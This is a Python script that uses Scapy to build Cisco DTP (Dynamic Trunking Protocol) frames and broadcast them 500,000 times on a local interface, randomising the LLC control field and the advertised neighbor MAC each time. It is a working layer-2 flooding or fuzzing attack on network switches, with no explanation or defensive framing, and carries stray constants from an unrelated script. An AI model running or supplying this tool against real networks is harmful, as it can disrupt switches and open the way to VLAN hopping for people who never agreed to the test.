#import re
from time import sleep
import binascii
import random, string
from scapy.contrib.dtp import *
from scapy.all import *

M_MAC = '00:05:1b:a8:6d:d3'#自分のMACアドレス
sample_string='0123456789abcdef0123456789abcdef'

PROTO_NUM = 17 #icmp:1 tcp:6 udp:17
TH1 = 71 #WriteProperty:71

IF = "en8"
#FILTER = "ether src "+ T_MAC1 +" and not ether src "+ M_MAC

dot = Dot3()
dot.src = M_MAC
dot.dst = 'ff:ff:ff:ff:ff:ff'

llc = LLC()
llc.dsap = 0
llc.ssap = 1
ctrl = 2

snap = SNAP()

dtp = DTP()
dtp.tlvlist = [DTPDomain(),DTPStatus(),DTPType(), DTPNeighbor(neighbor = M_MAC)]

pkt = dot/llc/snap/dtp

tmp1 = M_MAC

for i in range(0,500000):
    sendp(pkt,iface=IF)
    pkt[LLC].ctrl = random.randint(0,15)
    array = tmp1.split(':')
    array[0]=''.join(random.choices(sample_string,k=2))
    array[1]=''.join(random.choices(sample_string,k=2))
    array[2]=''.join(random.choices(sample_string,k=2))
    array[3]=''.join(random.choices(sample_string,k=2))
    array[4]=''.join(random.choices(sample_string,k=2))
    array[5]=''.join(random.choices(sample_string,k=2))
    tmp1 = ':'.join(array)
    pkt[DTP].tlvlist =[DTPDomain(),DTPStatus(),DTPType(), DTPNeighbor(neighbor = tmp1)]
